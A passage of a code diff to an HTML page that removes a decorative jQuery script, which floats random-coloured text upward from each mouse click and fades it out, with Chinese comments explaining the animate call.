-            "z-index": 999,
-            "top": y - 20,
-            "left": x,
-            "position": "absolute",
-            "font-weight": "bold",
-            "color": rand_color()
-          });
-          // 随机颜色
-          function rand_color() {
-            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
-          }
-          //在body添加这个标签
-          $("body").append($i);
-          //animate() 方法执行 CSS 属性集的自定义动画。
-          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
-          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
-          $i.animate({
-            //将原来的位置向上移动180
-            "top": y - 180,
-            "opacity": 0
-            //1500动画的速度
-          }, 1500, function () {
-            //时间到了自动删除
-            $i.remove();
-          });
-        });
-      })
-      ;
-    </script>
-  
-
-
-
-
-
-
-
+  </div>
 </body>
 </html>
